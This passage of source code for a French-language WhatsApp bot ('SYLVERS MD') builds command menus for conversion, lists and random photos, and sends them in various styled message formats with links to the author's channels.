                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-conversion': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Conversion* 」✣──╮
│${setv} ╭───────────╮
│${setv} │${prefix}obfusquer 🅡
│${setv} │${prefix}styletexte 🅡
│${setv} │${prefix}fliptexte 🅡
│${setv} │${prefix}tts 🅡
│${setv} │${prefix}dis 🅡
│${setv} │${prefix}en-gif 🅡
│${setv} │${prefix}en-qr 🅡
│${setv} │${prefix}bass 🅡
│${setv} │${prefix}blown 🅡
│${setv} │${prefix}deep 🅡
│${setv} │${prefix}earrape 🅡
│${setv} │${prefix}fast 🅡
│${setv} │${prefix}fat 🅡
│${setv} │${prefix}nightcore 🅡
│${setv} │${prefix}reverse 🅡
│${setv} │${prefix}robot 🅡
│${setv} │${prefix}slow 🅡
│${setv} │${prefix}smooth 🅡
│${setv} │${prefix}squirrel 🅡
│${setv} │${prefix}tinyurl 🅡
│${setv} │${prefix}en-vn 🅡
│${setv} │${prefix}en-ptv🅡
│${setv} │${prefix}en-audio 🅡
│${setv} │${prefix}en-mp3 🅡
│${setv} │${prefix}en-mp4🅡
│${setv} │${prefix}en-img 🅡
│${setv} │${prefix} en-vueunique🅡
│${setv} │${prefix}en-ptv 🅡
│${setv} │${prefix}sticker 🅡
│${setv} │${prefix}smeme 🅡
│${setv} │${prefix}smeta 🅡
│${setv} │${prefix}voler 🅑
│${setv} │${prefix}emoji-mix 🅡
│${setv} │${prefix}vol-audio 🅡
│${setv} │${prefix}vol-video 🅡
│${setv} │${prefix}ebinary 🅡
│${setv} │${prefix}dbinary 🅡
│${setv} │${prefix}ss-web 🅡
│${setv} │${prefix}quoted 🅡
│${setv} │${prefix} traduction 🅡
│${setv} │${prefix}get 🅡
│${setv} │${prefix}en-url 🅡
│${setv} │${prefix}ecrire 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'liste-menu': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *List Menu* 」✣───╮
│${setv} ╭───────────╮
│${setv} │${prefix}liste-boss 🅡
│${setv} │${prefix}liste-proprio 🅡
│${setv} │${prefix}liste-sticker 🅡
│${setv} │${prefix}liste-image 🅡
│${setv} │${prefix}liste-video 🅡
│${setv} │${prefix}liste-vn 🅡
│${setv} │${prefix}liste-apk 🅡
│${setv} │${prefix}liste-zip 🅡
│${setv} │${prefix}liste-pdf 🅡
│${setv} │${prefix}liste-grosmot 🅡
│${setv} │${prefix}liste-pv 🅡
│${setv} │${prefix}liste-groupe 🅡
│${setv} ╰───────────╯
╰──────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-randomphoto': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Random Photo* 」✣─╮
│${setv} ╭───────────╮
│${setv} │${prefix}aesthetic 🅡
│${setv} │${prefix}coffee 🅡
│${setv} │${prefix}wikimedia 🅡
│${setv} │${prefix}wallpaper 🅡
│${setv} │${prefix}art 🅡
│${setv} │${prefix}bts 🅡
│${setv} │${prefix}dogwoof 🅡
│${setv} │${prefix}catmeow 🅡
│${setv} │${prefix}lizardpic 🅡
│${setv} │${prefix}goosebird 🅡
│${setv} │${prefix}8ballpool 🅡
│${setv} │${prefix}cosplay 🅡
│${setv} │${prefix}hacker 🅡
│${setv} │${prefix}cyber 🅡
│${setv} │${prefix}gamewallpaper 🅡
│${setv} │${prefix}islamic 🅡
│${setv} │${prefix}jennie 🅡
│${setv} │${prefix}jiso 🅡
│${setv} │${prefix}satanic 🅡
│${setv} │${prefix}justina 🅡
│${setv} │${prefix}cartoon 🅡
│${setv} │${prefix}pentol 🅡
│${setv} │${prefix}cat 🅡
│${setv} │${prefix}kpop 🅡
│${setv} │${prefix}exo 🅡
│${setv} │${prefix}lisa 🅡
│${setv} │${prefix}space 🅡
│${setv} │${prefix}car 🅡
│${setv} │${prefix}technology 🅡
│${setv} │${prefix}bike 🅡
│${setv} │${prefix}shortquote 🅡
│${setv} │${prefix}antiwork 🅡
│${setv} │${prefix}hacking 🅡
│${setv} │${prefix}boneka 🅡
│${setv} │${prefix}rose 🅡
│${setv} │${prefix}ryujin 🅡
│${setv} │${prefix}ulzzangboy 🅡
│${setv} │${prefix}ulzzanggirl 🅡
│${setv} │${prefix}wallml 🅡
│${setv} │${prefix}wallphone 🅡
│${setv} │${prefix}mountain 🅡
│${setv} │${prefix}goose 🅡
│${setv} │${prefix}profilepic 🅡
│${setv} │${prefix}couplepp 🅡
│${setv} │${prefix}programming 🅡
│${setv} │${prefix}pubg 🅡
│${setv} │${prefix}blackpink 🅡
│${setv} │${prefix}randomboy 🅡  
│${setv} │${prefix}randomgirl 🅡
│${setv} │${prefix}hijab 🅡  
│${setv} │${prefix}chinese 🅡
│${setv} │${prefix}indo 🅡
│${setv} │${prefix}japanese 🅡
│${setv} │${prefix}korean 🅡
│${setv} │${prefix}malay 🅡
│${setv} │${prefix}thai 🅡
│${setv} │${prefix}vietnamese 🅡
│${setv} ╰────────────╯
╰───────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
